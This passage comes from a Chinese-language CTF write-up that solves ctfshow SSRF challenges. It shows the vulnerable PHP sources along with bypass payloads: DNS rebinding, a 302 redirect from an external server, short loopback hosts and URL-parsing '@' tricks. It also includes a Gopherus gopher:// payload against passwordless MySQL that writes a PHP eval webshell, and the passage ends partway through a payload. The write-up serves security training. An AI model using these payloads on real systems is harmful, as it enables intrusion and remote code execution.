class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><p>这一题多过滤了1和0</p><p>DNS重绑定绕过</p><p>payload</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs qml">使用解析到<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>的<span class="hljs-built_in">url</span>绕过<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//safe.taobao.com/flag.php</span><br><br>A记录sudo.cc指向IP地址<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>。<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//sudo.cc/flag.php </span><br></code></pre></td></tr></table></figure><p>或者使用302跳转绕过。</p><p>我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">具体步骤<br>在有公网的服务器linux系统下<br><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);<br><br>开启web服务<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7777</span><br><br><br>ssrf服务器访问<br>http:<span class="hljs-comment">//公网ip:7777/index.php</span><br><br>成功执行<span class="hljs-number">302</span>重定向<br></code></pre></td></tr></table></figure><p>有点无语，我的公网IP刚好带个0，所以不行，除非买个域名</p><hr><h2 id="web-355（host限制小于等于5省略绕过）"><a href="#web-355（host限制小于等于5省略绕过）" class="headerlink" title="web-355（host限制小于等于5省略绕过）"></a>web-355（host限制小于等于5省略绕过）</h2><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;<span class="hljs-comment">//限制了host长度必须小于等于5</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><p>看了一下，发现限制了host小于等于5，使用127.1省略绕过</p><p>payload：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">127.1</span>/flag.php<br><span class="hljs-attr">url</span>=http://<span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><hr><h2 id="web-356（host长度限制小于等于3）"><a href="#web-356（host长度限制小于等于3）" class="headerlink" title="web-356（host长度限制小于等于3）"></a>web-356（host长度限制小于等于3）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">3</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><p>这题限制了host长度小于等于3</p><p><strong>0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0</strong></p><p>payload：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">0.0</span>/flag.php<br><span class="hljs-attr">url</span>=http://<span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><hr><h2 id="web-357（DNS重绑定、302跳转绕过）"><a href="#web-357（DNS重绑定、302跳转绕过）" class="headerlink" title="web-357（DNS重绑定、302跳转绕过）"></a>web-357（DNS重绑定、302跳转绕过）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> scheme<br></code></pre></td></tr></table></figure><p>&#x2F; gethostbyname — 返回主机名对应的IPv4地址</p><p>&#x2F;&#x2F; filter_var — 使用特定的过滤器过滤一个变量</p><p>&#x2F;&#x2F; FILTER_VALIDATE_IP - 验证是否为有效的IP地址</p><p>&#x2F;&#x2F; FILTER_FLAG_NO_PRIV_RANGE - 排除私有IP地址</p><p>&#x2F;&#x2F; FILTER_FLAG_NO_RES_RANGE 排除保留IP地址 如回环地址127.0.0.1</p><p><strong>这题可以使用302跳转绕过。</strong></p><p>我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">具体步骤<br>在有公网的服务器linux系统下<br><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);<br><br>开启web服务<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7777</span><br><br><br>ssrf服务器访问<br>http:<span class="hljs-comment">//公网ip:7777/index.php</span><br><br>成功执行<span class="hljs-number">302</span>重定向<br></code></pre></td></tr></table></figure><hr><p>也可以使用DNS重绑定绕过</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">dns重绑定</a></p><p>在网站<a href="http://ceye.io/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%88%86%E9%85%8D%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%BB%99%E4%BD%A0%EF%BC%9A">http://ceye.io/注册账号，会自动分配一个域名给你：</a></p><p>payload:<a href="http://r.xxxxxx/flag.php">http://r.xxxxxx/flag.php</a><br>xxx为分配的域名</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">7</span>f000001.<span class="hljs-number">2</span>f62e200.rbndr.us/flag.php<br></code></pre></td></tr></table></figure><hr><h2 id="web-358（正则匹配绕过）"><a href="#web-358（正则匹配绕过）" class="headerlink" title="web-358（正则匹配绕过）"></a>web-358（正则匹配绕过）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code></p><p>payload：</p><p>如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?show<br><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-359（打无密码的MySQL）"><a href="#web-359（打无密码的MySQL）" class="headerlink" title="web-359（打无密码的MySQL）"></a>web-359（打无密码的MySQL）</h2><p>首先进去发现是个登录界面<br><img src="/../image/ctfshow-ssrf-1.png"></p><p>Gopherus工具使用获取RCE</p><p>Gopherus需要python2环境，需要安装并默认设置为python2</p><p>使用gopherus工具构造</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python gopherus.py --exploit mysql</span><br><span class="language-xml"></span><br><span class="language-xml">root</span><br><span class="language-xml"></span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/html/1.php&#x27;;</span><br></code></pre></td></tr></table></figure><p>生成payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/_<span class="hljs-variable">%a3</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%85</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%21</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%00</span><span class="hljs-variable">%66</span><span class="hljs-variable">%03</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%05</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%78</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%08</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%04</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%05</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%35</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%06</span><span class="hljs-variable">%35</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%09</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%06</span><span class="hljs-variable">%78</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%05</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%46</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%40</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%31</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%27</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><br></code></pre></td></tr></table></figure><p>然后对后面进行URL加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:3306</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">38</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span 